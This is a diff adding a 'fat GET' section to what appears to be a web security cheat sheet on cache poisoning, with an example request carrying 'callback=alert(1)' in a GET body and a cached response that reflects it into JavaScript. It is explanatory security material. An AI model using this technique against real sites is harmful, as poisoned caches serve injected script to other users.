@@ -256,3 +256,28 @@ The cache excludes `excluded_param` from the cache key but processes `example` a
 This allows for cache poisoning or XSS by taking advantage of parsing inconsistencies.
 
 Poc: [Parameter cloaking](https://www.youtube.com/watch?v=vdb_9HACpkM)
+
+### Exploiting fat GET support
+
+In some cases, the HTTP method may not be keyed. This might allow you to poison the cache with a POST request containing a malicious payload in the body. Your payload would then even be served in response to users' GET requests.
+<br>
+**Request:**
+```
+GET /js/geolocate.js?callback=setCountryCookie HTTP/2
+Host: test.com
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
+
+callback=alert(1)
+```
+**Response**
+```
+HTTP/2 200 OK
+Content-Type: application/javascript; charset=utf-8
+Cache-Control: max-age=35
+Age: 2
+X-Cache: hit
+
+alert(1)({"country":"United Kingdom"});
+```
+
+In this case, the cache key would be based on the request line, but the server-side value of the parameter would be taken from the body.
